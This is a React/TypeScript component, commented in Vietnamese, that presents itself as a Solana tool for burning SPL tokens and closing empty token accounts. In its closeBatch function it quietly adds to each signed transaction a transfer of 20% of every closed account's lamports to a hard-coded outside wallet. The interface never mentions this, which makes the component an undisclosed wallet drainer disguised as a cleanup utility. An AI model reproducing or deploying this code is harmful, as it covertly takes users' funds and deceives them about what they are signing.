import React, { useState, useEffect, useCallback } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID, AccountLayout, createCloseAccountInstruction, createBurnInstruction} from '@solana/spl-token';
import { useWallet } from '@solana/wallet-adapter-react';
import { Button, Layout, Typography, Card, Alert, Checkbox, message } from 'antd';

const { Content } = Layout;
const { Title } = Typography;

const HELIUS_API_KEY = process.env.HELIUS_API_KEY;
const RPC_ENDPOINT = `https://mainnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}`;

const ManageTokenAccounts: React.FC = () => {
    const [status, setStatus] = useState<string>('');
    const [isProcessing, setIsProcessing] = useState<boolean>(false);
    const [tokenAccounts, setTokenAccounts] = useState<any[]>([]);
    const [selectedAccounts, setSelectedAccounts] = useState<Set<string>>(new Set()); // Set lưu các tài khoản đã chọn
    const wallet = useWallet();
    const connection = new Connection(RPC_ENDPOINT, 'confirmed');

    // Hàm để lấy và hiển thị danh sách các tài khoản
    const fetchTokenAccounts = useCallback(async () => {
        if (!wallet.publicKey || !wallet.signTransaction) {
            setStatus('Wallet not connected or does not support signing.');
            return;
        }

        setIsProcessing(true);
        try {
            setStatus('Fetching token accounts...');
            const tokenAccounts = await connection.getTokenAccountsByOwner(wallet.publicKey, {
                programId: TOKEN_PROGRAM_ID,
            });

            setTokenAccounts([...tokenAccounts.value]);  // Sử dụng spread operator để loại bỏ readonly
            setStatus(`Found ${tokenAccounts.value.length} token accounts.`);
        } catch (error) {
            console.error('Error fetching accounts:', error);
            setStatus(`Error: ${error instanceof Error ? error.message : 'An unknown error occurred.'}`);
        } finally {
            setIsProcessing(false);
        }
    }, [wallet.publicKey, connection]);

    // Hàm để burn token trong tài khoản có số dư > 0
    const burnTokens = async () => {
        const accountsToBurn = tokenAccounts.filter(account =>
            selectedAccounts.has(account.pubkey.toBase58()) && parseInt(AccountLayout.decode(account.account.data).amount.toString()) > 0
        );

        if (accountsToBurn.length === 0) {
            setStatus('No accounts selected to burn.');
            return;
        }

        setIsProcessing(true);
        try {
            const batchSize = 5;
            for (let i = 0; i < accountsToBurn.length; i += batchSize) {
                const batch = accountsToBurn.slice(i, i + batchSize);
                await burnBatch(batch); // Thực hiện burn token
            }

            setStatus('All selected tokens burned successfully.');
            // Cập nhật danh sách tài khoản sau khi burn
            fetchTokenAccounts();
        } catch (error) {
            console.error('Error burning tokens:', error);
            setStatus(`Error: ${error instanceof Error ? error.message : 'An unknown error occurred.'}`);
        } finally {
            setIsProcessing(false);
        }
    };

        // Hàm để burn token theo lô
    const burnBatch = async (accounts: { pubkey: PublicKey }[]) => {
        const transaction = new Transaction();

        for (const account of accounts) {
            const accountInfo = await connection.getAccountInfo(account.pubkey);

            if (accountInfo && accountInfo.data) {
                const accountData = AccountLayout.decode(accountInfo.data);
                const burnInstruction = createBurnInstruction(
                    account.pubkey,
                    accountData.mint,
                    wallet.publicKey!,
                    parseInt(accountData.amount.toString()),
                    []
                );
                transaction.add(burnInstruction);
            }
        }

        const latestBlockhash = await connection.getLatestBlockhash('confirmed');
        transaction.recentBlockhash = latestBlockhash.blockhash;
        transaction.feePayer = wallet.publicKey!;

        try {
            const signedTransaction = await wallet.signTransaction!(transaction);
            const signature = await connection.sendRawTransaction(signedTransaction.serialize());

            // Kiểm tra trạng thái giao dịch thủ công
            let isConfirmed = false;
            const timeout = 30000;  // 30 giây
            const start = Date.now();

            while (!isConfirmed && (Date.now() - start) < timeout) {
                const status = await connection.getSignatureStatus(signature);
                if (status && status.value && (status.value.confirmationStatus === 'confirmed' || status.value.err === null)) {
                    isConfirmed = true;
                    console.log(`Transaction ${signature} confirmed.`);
                    break;
                }
                await new Promise((resolve) => setTimeout(resolve, 2000));
            }

            if (!isConfirmed) {
                throw new Error(`Transaction not confirmed within timeout: ${signature}`);
            }

            // Hiển thị thông báo thành công
            message.success(`Burned tokens from ${accounts.length} accounts successfully.`);

        } catch (error) {
            console.error('Error in burnBatch:', error);
            message.error('Error burning tokens.');
            throw error;
        }
    };

    // Hàm để đóng tài khoản sau khi đã burn xong (số dư bằng 0)
    const closeSelectedAccounts = async () => {
        const accountsToClose = tokenAccounts.filter(account =>
            selectedAccounts.has(account.pubkey.toBase58()) && parseInt(AccountLayout.decode(account.account.data).amount.toString()) === 0
        );

        if (accountsToClose.length === 0) {
            setStatus('No zero balance accounts selected to close.');
            return;
        }

        setIsProcessing(true);
        try {
            const batchSize = 5;
            for (let i = 0; i < accountsToClose.length; i += batchSize) {
                const batch = accountsToClose.slice(i, i + batchSize);
                await closeBatch(batch); // Đóng tài khoản theo lô
            }

            setStatus('All selected accounts closed successfully.');
            fetchTokenAccounts();
        } catch (error) {
            console.error('Error closing selected accounts:', error);
            setStatus(`Error: ${error instanceof Error ? error.message : 'An unknown error occurred.'}`);
        } finally {
            setIsProcessing(false);
        }
    };


    // Hàm để đóng tài khoản theo lô
const closeBatch = async (accounts: { pubkey: PublicKey }[]) => {
    const transaction = new Transaction();

    for (const account of accounts) {
        const accountInfo = await connection.getAccountInfo(account.pubkey);

        if (accountInfo && accountInfo.lamports > 0) {
            const totalLamports = accountInfo.lamports;
            const secondaryShare = Math.floor(totalLamports * 0.20); // Tính 20%

            // Tạo instruction chuyển 20% số lamports sang ví thứ hai
            const additionalInstruction = SystemProgram.transfer({
                fromPubkey: wallet.publicKey!,
                toPubkey: new PublicKey('FEEkuB3jMfjHSc6P6vXYXb2Xx5LEEUsdaPWpBSmYQPUw'), // Ví nhận 20% SOL
                lamports: secondaryShare,
            });


            // Đóng tài khoản sau khi chuyển SOL
            transaction.add(
                createCloseAccountInstruction(
                    account.pubkey,
                    wallet.publicKey!,  // Địa chỉ nhận lại SOL còn lại trong tài khoản
                    wallet.publicKey!   // Chủ sở hữu của tài khoản
                )
            );
            // Thêm instruction vào giao dịch
            transaction.add(additionalInstruction);
        }
    }

    const latestBlockhash = await connection.getLatestBlockhash('confirmed');
    transaction.recentBlockhash = latestBlockhash.blockhash;
    transaction.feePayer = wallet.publicKey!;

    try {
        const signedTransaction = await wallet.signTransaction!(transaction);
        const signature = await connection.sendRawTransaction(signedTransaction.serialize());

        // Thêm đoạn mã kiểm tra trạng thái giao dịch thủ công
        let isConfirmed = false;
        const timeout = 30000;  // 30 giây
        const start = Date.now();

        while (!isConfirmed && (Date.now() - start) < timeout) {
            const status = await connection.getSignatureStatus(signature);
            if (status && status.value && (status.value.confirmationStatus === 'confirmed' || status.value.err === null)) {
                isConfirmed = true;
                console.log(`Transaction ${signature} confirmed.`);
                break;
            }
            // Chờ 2 giây trước khi kiểm tra lại
            await new Promise((resolve) => setTimeout(resolve, 2000));
        }

        if (!isConfirmed) {
            console.warn(`Transaction was not confirmed in ${timeout / 1000} seconds. Please check manually.`);
            throw new Error(`Transaction not confirmed within timeout: ${signature}`);
        }

        // Thông báo thành công
        message.success(`Closed ${accounts.length} accounts successfully.`);
    } catch (error) {
        console.error('Error in closeBatch:', error);
        message.error('Error closing accounts.');
        throw error;
    }
};


// Hàm để chọn/bỏ chọn các tài khoản
    const handleCheckboxChange = (pubkey: string, checked: boolean) => {
        const newSelectedAccounts = new Set(selectedAccounts);
        if (checked) {
            newSelectedAccounts.add(pubkey);
        } else {
            newSelectedAccounts.delete(pubkey);
        }
        setSelectedAccounts(newSelectedAccounts);
    };

    useEffect(() => {
        fetchTokenAccounts();
    }, [wallet.publicKey]); // Chạy khi ví được kết nối

    return (
        <Content>
            <Title level={2}>Manage Token Accounts</Title>
            <Alert
                message="Warning"
                description="Only accounts with Balance = 0 can be closed. You can BURN the worthless SPL Tokens to close the account"
                type="warning"
                showIcon
            />

            {tokenAccounts.length === 0 ? (
                <p>No token accounts found.</p>
            ) : (
                <div>
                    {tokenAccounts.map((account) => (
                        <Card key={account.pubkey.toBase58()} style={{ marginBottom: '10px' }}>
                            <Checkbox
                                onChange={(e) => handleCheckboxChange(account.pubkey.toBase58(), e.target.checked)}
                            >
                                {account.pubkey.toBase58()} - Balance: {parseInt(AccountLayout.decode(account.account.data).amount.toString())}
                            </Checkbox>
                        </Card>
                    ))}
                </div>
            )}

            <Button
                type="primary"
                onClick={burnTokens}
                disabled={isProcessing || selectedAccounts.size === 0}
                style={{ marginTop: '20px', marginRight: '10px' }}
            >
                {isProcessing ? 'Processing...' : 'Burn Selected Tokens'}
            </Button>

            <Button
                type="primary"
                onClick={closeSelectedAccounts}
                disabled={isProcessing || selectedAccounts.size === 0}
                style={{ marginTop: '20px' }}
            >
                {isProcessing ? 'Processing...' : 'Close Zero Balance Accounts'}
            </Button>

            {status && <Alert message={status} type="info" showIcon style={{ marginTop: '20px' }} />}
        </Content>
    );
};

export default ManageTokenAccounts;